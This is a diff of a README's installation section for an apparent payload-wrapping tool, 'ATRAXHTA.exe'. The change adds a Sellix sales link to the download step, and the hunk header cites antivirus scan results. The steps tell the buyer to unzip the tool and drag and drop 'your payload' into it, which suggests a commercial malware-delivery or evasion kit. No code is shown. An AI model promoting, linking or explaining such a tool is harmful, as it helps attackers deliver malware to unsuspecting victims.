@@ -29,7 +29,7 @@ Scan Results: https://www.kleenscan.com/scan_result/72462f2efcaf34c637ca0837e522
 
 ### 📖 HOW TO INSTALL
 
-1. Download the tool ('')
+1. Download the tool ('https://sellix.io/product/5fef4f77d952d')
 2. Unzip the file
 3. Open the ATRAXHTA.exe file
 4. Drag & Drop your payload
